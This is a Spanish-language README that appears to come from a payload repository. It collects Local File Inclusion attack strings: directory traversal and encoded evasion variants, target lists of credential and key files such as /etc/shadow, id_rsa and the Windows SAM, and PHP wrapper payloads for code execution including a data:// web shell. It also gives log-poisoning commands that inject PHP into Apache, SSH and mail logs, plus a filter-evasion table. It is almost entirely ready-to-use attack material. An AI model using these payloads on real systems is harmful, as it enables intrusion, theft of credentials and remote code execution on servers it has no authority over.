# 📂 Colección de payloads LFI

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 🐧 Archivos de Linux

### Recorrido básico de directorios (traversal)
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Codificado como URL
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Técnicas de evasión
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Archivos de interés en Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 Archivos de Windows

### Recorrido básico de directorios (traversal)
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Archivos de interés en Windows
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Wrappers de PHP (envoltorios de acceso)

> **Compatibilidad:** los wrappers necesitan extensiones, permisos y configuraciones concretas; leer un archivo no implica ejecutarlo. Los ejemplos con bytes nulos y rutas antiguas no son evasiones universales en versiones actuales. Véase el [manual de PHP sobre bytes nulos](https://www.php.net/manual/en/security.filesystem.nullbytes.php). El acceso a `/proc/self/environ` tampoco garantiza que contenga User-Agent.

### php://filter (leer el código fuente)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

### data:// Wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### zip:// Wrapper
```
zip://path/to/file.zip%23shell.php
```

### phar:// Wrapper
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Contaminación de registros (log poisoning) para RCE

### Registro de acceso de Apache
```bash
# 1. Inyectar PHP mediante User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Incluir el archivo de registro
?page=/var/log/apache2/access.log&cmd=id
```

### Registro de SSH
```bash
# 1. Inyectar mediante SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Incluir el registro
?page=/var/log/auth.log&cmd=id
```

### Registro de correo
```bash
# 1. Enviar un correo con contenido inyectado
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Incluir el registro
?page=/var/log/mail.log&cmd=id
```

### Entorno del proceso (Proc Environ)
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📊 Referencia rápida

### Detección
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Evasión de filtros
| Filtro | Evasión |
|--------|--------|
| `../` bloqueado | `....//`, `..././` |
| `.php` obligatorio | `%00`, byte nulo |
| Lista de permitidos | Wrappers php:// |

### Parámetros habituales
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Recursos

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Arsenal de payloads LFI</b><br>
  <i>¡Solo con fines educativos!</i>
</p>
